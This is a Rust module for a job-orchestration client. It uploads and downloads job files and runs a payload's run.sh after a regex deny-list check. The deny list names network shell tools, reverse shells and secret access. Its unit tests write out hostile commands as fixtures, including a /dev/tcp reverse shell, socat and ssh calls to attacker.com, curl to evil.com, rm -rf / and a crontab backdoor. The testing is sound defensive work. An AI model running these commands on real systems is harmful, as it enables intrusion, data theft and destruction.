use crate::models::status_dto::Status;
use std::process::Command;
use std::sync::LazyLock;

use crate::models::job_dao::Job;
use crate::models::payload_dao::Payload;
use crate::services::orchestrator::Endpoint;
use crate::services::orchestrator::{DownloadError, UploadError};
use futures_util::StreamExt;
use regex::Regex;
use reqwest::multipart::{Form, Part};
use tokio::fs::File;
use tokio::io::AsyncWriteExt;
use tokio_util::io::ReaderStream;
use tracing::info;
use walkdir::WalkDir;

use axum::http::{StatusCode, header};
#[derive(Debug, thiserror::Error)]
pub enum ClientError {
    #[error("Execution error")]
    Execution,
    #[error("No execution script found")]
    NoExecScript,
    #[error("Unsafe script detected: {reason}")]
    UnsafeScript { reason: String },
}

pub struct Client;

// Server side
impl Endpoint for Client {
    async fn upload(&self, job: &Job, url: &str) -> Result<u32, UploadError> {
        // Create multipart form
        let mut form = Form::new();

        // Walk the directory
        let walkdir = WalkDir::new(&job.loc);
        let entries: Vec<_> = walkdir
            .into_iter()
            // Filter out errors, this means permissions and etc
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
            .collect();

        // Process files
        for entry in entries {
            let path = entry.path();

            // Get metadata
            let metadata = tokio::fs::metadata(path)
                .await
                .map_err(|e| UploadError::FileRead {
                    path: path.display().to_string(),
                    source: e,
                })?;
            let file_size = metadata.len();

            // Open file but don't read it so it does not go into memory
            let file = File::open(path).await.map_err(|e| UploadError::FileRead {
                path: path.display().to_string(),
                source: e,
            })?;

            // Convert absolute paths to relative paths to preserve directory structure
            let relative_path = path
                .strip_prefix(&job.loc)
                .unwrap_or(path)
                .to_string_lossy()
                .to_string();

            // Get filename
            let filename = path
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("file")
                .to_string();

            // Create stream
            let stream = ReaderStream::new(file);
            let body = reqwest::Body::wrap_stream(stream);

            // Create the part with stream
            let part = Part::stream_with_length(body, file_size).file_name(filename);

            form = form.part(relative_path, part);
        }

        let client = reqwest::Client::new();
        let response = client
            .post(url)
            .multipart(form)
            .send()
            .await
            .map_err(UploadError::ResponseReadFailed)?;

        if response.status().is_success() {
            // The client will return the `Payload`, deserialize it here (:
            let body = response
                .text()
                .await
                .map_err(UploadError::ResponseReadFailed)?;

            let payload: Payload =
                serde_json::from_str(&body).map_err(UploadError::DeserializationFailed)?;

            Ok(payload.id)
        } else {
            let status = response.status();
            let body = response
                .text()
                .await
                .unwrap_or_else(|_| "Unable to read body".to_string());
            Err(UploadError::UnexpectedStatus { status, body })
        }
    }

    async fn download(&self, j: &Job, url: &str) -> Result<Status, DownloadError> {
        let client = reqwest::Client::new();
        // Append the job id to the url
        let response = client
            .get(format!("{url}/{0}", j.dest_id))
            .send()
            .await
            .map_err(DownloadError::RequestFailed)?;

        let status = response.status();
        let content_type = response
            .headers()
            .get(header::CONTENT_TYPE)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("");

        if status == StatusCode::OK && content_type.contains("application/zip") {
            // Job is finished, save it to disk
            let output_path = j.loc.join("output.zip");

            let mut file = match File::create(&output_path).await {
                Ok(f) => f,
                Err(e) => {
                    return Err(DownloadError::FileCreate {
                        path: output_path.display().to_string(),
                        source: e,
                    });
                }
            };

            let mut stream = response.bytes_stream();
            while let Some(chunk) = stream.next().await {
                let chunk = match chunk {
                    Ok(c) => c,
                    Err(e) => return Err(DownloadError::ResponseReadFailed(e)),
                };
                if let Err(e) = file.write_all(&chunk).await {
                    return Err(DownloadError::FileWrite {
                        path: output_path.display().to_string(),
                        source: e,
                    });
                }
            }

            if let Err(e) = file.flush().await {
                return Err(DownloadError::FileWrite {
                    path: output_path.display().to_string(),
                    source: e,
                });
            }

            // All good, file saved
            Ok(Status::Completed)
        } else {
            // Job not yet finished, propagate the status
            let payload: Payload = match response.json().await {
                Ok(p) => p,
                Err(e) => {
                    // We could not make a request to the client
                    return Err(DownloadError::RequestFailed(e));
                }
            };
            Ok(payload.status)
        }
    }
}

/// Validate a script for dangerous patterns before execution.
///
/// NOTE: This is NOT a full security solution. It is a basic sanity check
/// that catches obviously dangerous patterns. Input scripts are still
/// expected to come from trusted sources and be clean. This function is
/// a defense-in-depth measure and can be bypassed by determined actors.
fn validate_script(path: &std::path::Path) -> Result<(), ClientError> {
    static DANGEROUS_PATTERNS: LazyLock<Vec<(Regex, &'static str)>> = LazyLock::new(|| {
        [
            // Destructive commands
            //  NOTE: This regex will match all `rm` usages and this
            //   could lead to false positives. Keep this in mind
            //   when creating scripts!
            (r"rm\s+(-[a-zA-Z]*)?.*(/|~)", "destructive rm command"),
            (r"\bmkfs\b", "filesystem format command"),
            (r"dd\s+.*of=/dev", "direct device write"),
            (r"dd\s+.*if=/dev/(zero|urandom)", "disk-filling dd command"),
            // Sensitive file access
            (r"/etc/passwd", "access to /etc/passwd"),
            (r"/etc/shadow", "access to /etc/shadow"),
            (r"/etc/sudoers", "access to /etc/sudoers"),
            (r"/proc/", "access to /proc"),
            (r"/sys/", "access to /sys"),
            (r"~/.ssh/", "access to SSH keys"),
            (r"/root/", "access to root home"),
            (r"/var/run/docker\.sock", "access to Docker socket"),
            // Network exfiltration tools
            (r"\bcurl\b", "network tool: curl"),
            (r"\bwget\b", "network tool: wget"),
            (r"\bnc\b", "network tool: nc"),
            (r"\bncat\b", "network tool: ncat"),
            (r"\bsocat\b", "network tool: socat"),
            (r"\bssh\b", "network tool: ssh"),
            (r"\bscp\b", "network tool: scp"),
            (r"\bsftp\b", "network tool: sftp"),
            (r"\btelnet\b", "network tool: telnet"),
            (r"\brsync\b", "network tool: rsync"),
            // Reverse shells
            (r"/dev/tcp/", "reverse shell via /dev/tcp"),
            (r"/dev/udp/", "reverse shell via /dev/udp"),
            // Privilege escalation
            (r"\bsudo\b", "privilege escalation: sudo"),
            (r"su\s+", "privilege escalation: su"),
            (
                r"chmod\s+[0-7]*[4-7][0-7]{2}|chmod\s+\+s",
                "dangerous chmod",
            ),
            (r"\bchown\b", "ownership change: chown"),
            // Container/system escape
            (r"\bchroot\b", "container escape: chroot"),
            (r"\bnsenter\b", "container escape: nsenter"),
            (r"\bunshare\b", "container escape: unshare"),
            (r"\bmount\b", "filesystem manipulation: mount"),
            (r"\bumount\b", "filesystem manipulation: umount"),
            (r"\bdocker\b", "container escape: docker"),
            (r"\bkubectl\b", "container escape: kubectl"),
            // Kernel/system manipulation
            (r"\bsysctl\b", "kernel manipulation: sysctl"),
            (r"\bmodprobe\b", "kernel module: modprobe"),
            (r"\binsmod\b", "kernel module: insmod"),
            (r"\brmmod\b", "kernel module: rmmod"),
            (r"\biptables\b", "firewall manipulation: iptables"),
            (r"\bnftables\b", "firewall manipulation: nftables"),
            // Obfuscated execution
            (
                r"base64.*\|\s*(bash|sh)",
                "obfuscated execution: base64 pipe to shell",
            ),
            (r"\beval\s+", "dynamic code execution: eval"),
            (r"\bpython[23]?\s+-c\b", "inline interpreter: python"),
            (r"\bperl\s+-e\b", "inline interpreter: perl"),
            (r"\bruby\s+-e\b", "inline interpreter: ruby"),
            // Persistence mechanisms
            (r"\bcrontab\b", "persistence: crontab"),
            (r"/etc/cron", "persistence: cron directory"),
            (r"\bsystemctl\b", "persistence: systemctl"),
            (r"\bservice\s+", "persistence: service command"),
            // NOTE: The regex below is an improvment on the `\bat\b` regex
            // that would effectively match anything that has the words `at`
            (
                r"(?m)(?:^|[;&|]{1,2}\s*)at(?:\s+|-|\b)",
                "persistence: at scheduler",
            ),
            // Fork bombs
            (r":\(\)\{.*:\|:", "fork bomb"),
            // Resource exhaustion
            (r"\bstress\b", "resource exhaustion: stress"),
            (r"\bstress-ng\b", "resource exhaustion: stress-ng"),
            // Crypto mining
            (r"\bxmrig\b", "crypto mining: xmrig"),
            (r"\bminerd\b", "crypto mining: minerd"),
            (r"\bcpuminer\b", "crypto mining: cpuminer"),
            // Environment secrets
            (r"\$AWS_", "environment secret: AWS"),
            (r"\$SECRET", "environment secret: SECRET"),
            (r"\$TOKEN", "environment secret: TOKEN"),
            (r"\$PASSWORD", "environment secret: PASSWORD"),
            (r"\$API_KEY", "environment secret: API_KEY"),
        ]
        .into_iter()
        .map(|(pat, desc)| (Regex::new(pat).expect("invalid regex pattern"), desc))
        .collect()
    });

    // Since the script will be loaded fully to memory, check its size!
    const MAX_SCRIPT_SIZE: u64 = 1024 * 1024 * 20; // 20 MiB
    let metadata = std::fs::metadata(path).map_err(|_| ClientError::NoExecScript)?;
    if metadata.len() > MAX_SCRIPT_SIZE {
        return Err(ClientError::UnsafeScript {
            reason: "script too large".to_string(),
        });
    }
    let bytes = std::fs::read(path).map_err(|_| ClientError::NoExecScript)?;
    let content = String::from_utf8(bytes).map_err(|_| ClientError::UnsafeScript {
        reason: "script is not valid UTF-8".to_string(),
    })?;

    for (re, description) in &*DANGEROUS_PATTERNS {
        if re.is_match(&content) {
            return Err(ClientError::UnsafeScript {
                reason: description.to_string(),
            });
        }
    }

    Ok(())
}

/// Execute the `run.sh` script contained in the payload directory.
///
/// # Security
///
/// This function runs arbitrary code (`bash run.sh`) with the full
/// privileges of the current process. No filesystem isolation is
/// applied — the script can read and write anything the process can.
/// Callers must ensure that the payload originates from a trusted
/// source or that the process is sandboxed externally (e.g., via
/// container resource limits, read-only rootfs, network isolation).
pub fn execute_payload(payload: &Payload) -> Result<Status, ClientError> {
    info!("{:?}", payload);

    // Expect the payload.loc to contain a `run.sh` script
    let run_script = payload.loc.join("run.sh");

    // Make sure the script exists
    if !run_script.exists() {
        return Err(ClientError::NoExecScript);
    }

    // Validate script content before execution
    validate_script(&run_script)?;

    // Execute script and wait for it to finish
    let _exit_status = Command::new("bash")
        .arg(run_script)
        .current_dir(&payload.loc)
        .status()
        .map_err(|_| ClientError::Execution)?;

    // TODO: Capture the exit status here and do something with it

    Ok(Status::Completed)
}

#[cfg(test)]
mod test {

    use super::*;
    use mockito::Server;
    use std::fs;

    #[test]
    fn test_execute_payload() {
        // Prepare a temporary payload
        let temp_dir = tempfile::tempdir().unwrap();
        let mut payload = Payload::new();
        payload.set_loc(temp_dir.path().to_path_buf());

        // Add a simple run.sh script
        std::fs::write(payload.loc.join("run.sh"), b"#!/bin/bash").unwrap();

        let result = execute_payload(&payload);

        assert!(result.is_ok());
    }

    #[test]
    fn test_execute_payload_no_script() {
        // Prepare a temporary payload
        let temp_dir = tempfile::tempdir().unwrap();
        let mut payload = Payload::new();
        payload.set_loc(temp_dir.path().to_path_buf());

        let result = execute_payload(&payload);

        assert!(matches!(result, Err(ClientError::NoExecScript)));
    }

    // ===== validate_script tests =====

    #[test]
    fn test_validate_script_clean() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\necho 'Hello, World!'\nexit 0\n").unwrap();
        assert!(validate_script(&script_path).is_ok());
    }

    #[test]
    fn test_validate_script_rm_rf() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\nrm -rf /\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_curl() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\ncurl http://evil.com\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_sudo() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\nsudo apt install something\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_reverse_shell() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4242 0>&1\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_env_secrets() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\necho $AWS_SECRET_KEY\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_base64_pipe_to_shell() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\necho dGVzdA== | base64 -d | bash\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_eval() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\neval \"rm -rf /\"\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_python_inline() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\npython3 -c 'import os; os.system(\"bad\")'\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_nsenter() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\nnsenter --target 1 --mount\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_docker() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\ndocker run --privileged -v /:/host alpine\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_socat() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\nsocat TCP:attacker.com:4444 EXEC:bash\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_crontab() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\ncrontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_mount() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\nmount /dev/sda1 /mnt\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_ssh() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\nssh user@attacker.com 'cat /etc/hosts'\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_xmrig() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\n./xmrig --pool mining.pool:3333\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_disk_fill() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\ndd if=/dev/zero of=/tmp/fill bs=1M count=99999\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_docker_socket() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\ncat /var/run/docker.sock\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_kernel_module() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\ninsmod /tmp/rootkit.ko\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_execute_payload_unsafe_script() {
        let temp_dir = tempfile::tempdir().unwrap();
        let mut payload = Payload::new();
        payload.set_loc(temp_dir.path().to_path_buf());
        fs::write(payload.loc.join("run.sh"), b"#!/bin/bash\nrm -rf /\n").unwrap();
        let result = execute_payload(&payload);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    // ===== Endpoint trait tests =====

    #[tokio::test]
    async fn test_client_upload_success() {
        let mut server = Server::new_async().await;
        let temp_dir = tempfile::tempdir().unwrap();

        // Create a job with test files
        let mut job = Job::new(temp_dir.path().to_str().unwrap());
        job.set_user_id(1);
        job.set_service("test".to_string());

        // Create job directory and add test file
        fs::create_dir_all(&job.loc).unwrap();
        fs::write(job.loc.join("test.txt"), b"test content").unwrap();

        // Mock server response
        let mut mock_payload = Payload::new();
        mock_payload.set_id(42);
        mock_payload.set_status(crate::models::status_dto::Status::Prepared);
        mock_payload.set_loc(temp_dir.path().to_path_buf());
        let mock_response = serde_json::to_string(&mock_payload).unwrap();

        let mock = server
            .mock("POST", "/submit")
            .with_status(200)
            .with_header("content-type", "application/json")
            .with_body(mock_response)
            .create_async()
            .await;

        let client = Client;
        let url = format!("{}/submit", server.url());
        let result = client.upload(&job, &url).await;

        mock.assert_async().await;
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), 42);
    }

    #[tokio::test]
    async fn test_client_upload_with_nested_files() {
        let mut server = Server::new_async().await;
        let temp_dir = tempfile::tempdir().unwrap();

        // Create a job with nested directory structure
        let mut job = Job::new(temp_dir.path().to_str().unwrap());
        job.set_user_id(1);
        job.set_service("test".to_string());

        // Create nested directories
        fs::create_dir_all(job.loc.join("subdir1")).unwrap();
        fs::create_dir_all(job.loc.join("subdir2/nested")).unwrap();
        fs::write(job.loc.join("root.txt"), b"root file").unwrap();
        fs::write(job.loc.join("subdir1/file1.txt"), b"file 1").unwrap();
        fs::write(job.loc.join("subdir2/nested/file2.txt"), b"file 2").unwrap();

        // Mock server response
        let mut mock_payload = Payload::new();
        mock_payload.set_id(100);
        mock_payload.set_status(crate::models::status_dto::Status::Prepared);
        mock_payload.set_loc(temp_dir.path().to_path_buf());
        let mock_response = serde_json::to_string(&mock_payload).unwrap();

        let mock = server
            .mock("POST", "/submit")
            .with_status(200)
            .with_body(mock_response)
            .create_async()
            .await;

        let client = Client;
        let url = format!("{}/submit", server.url());
        let result = client.upload(&job, &url).await;

        mock.assert_async().await;
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), 100);
    }

    #[tokio::test]
    async fn test_client_upload_server_error() {
        let mut server = Server::new_async().await;
        let temp_dir = tempfile::tempdir().unwrap();

        let mut job = Job::new(temp_dir.path().to_str().unwrap());
        job.set_user_id(1);
        job.set_service("test".to_string());
        fs::create_dir_all(&job.loc).unwrap();
        fs::write(job.loc.join("test.txt"), b"test").unwrap();

        // Mock server error
        let mock = server
            .mock("POST", "/submit")
            .with_status(500)
            .with_body("Internal Server Error")
            .create_async()
            .await;

        let client = Client;
        let url = format!("{}/submit", server.url());
        let result = client.upload(&job, &url).await;

        mock.assert_async().await;
        assert!(result.is_err());
        match result {
            Err(UploadError::UnexpectedStatus { status, body }) => {
                assert_eq!(status, StatusCode::INTERNAL_SERVER_ERROR);
                assert_eq!(body, "Internal Server Error");
            }
            _ => panic!("Expected UnexpectedStatus error"),
        }
    }

    #[tokio::test]
    async fn test_client_upload_invalid_json_response() {
        let mut server = Server::new_async().await;
        let temp_dir = tempfile::tempdir().unwrap();

        let mut job = Job::new(temp_dir.path().to_str().unwrap());
        job.set_user_id(1);
        job.set_service("test".to_string());
        fs::create_dir_all(&job.loc).unwrap();
        fs::write(job.loc.join("test.txt"), b"test").unwrap();

        // Mock server with invalid JSON
        let mock = server
            .mock("POST", "/submit")
            .with_status(200)
            .with_body("not valid json")
            .create_async()
            .await;

        let client = Client;
        let url = format!("{}/submit", server.url());
        let result = client.upload(&job, &url).await;

        mock.assert_async().await;
        assert!(result.is_err());
        assert!(matches!(result, Err(UploadError::DeserializationFailed(_))));
    }

    #[tokio::test]
    async fn test_client_download_success() {
        let mut server = Server::new_async().await;
        let temp_dir = tempfile::tempdir().unwrap();

        let mut job = Job::new(temp_dir.path().to_str().unwrap());
        job.dest_id = 123;
        fs::create_dir_all(&job.loc).unwrap();

        // Mock server response with file content
        let mock = server
            .mock("GET", "/retrieve/123")
            .with_status(200)
            .with_header("content-type", "application/zip")
            .with_body(b"test zip content")
            .create_async()
            .await;

        let client = Client;
        let url = format!("{}/retrieve", server.url());
        let result = client.download(&job, &url).await;

        mock.assert_async().await;

        assert!(result.is_ok());

        // Verify file was created
        let output_path = job.loc.join("output.zip");
        assert!(output_path.exists());
        let content = fs::read(output_path).unwrap();
        assert_eq!(content, b"test zip content");
    }
}
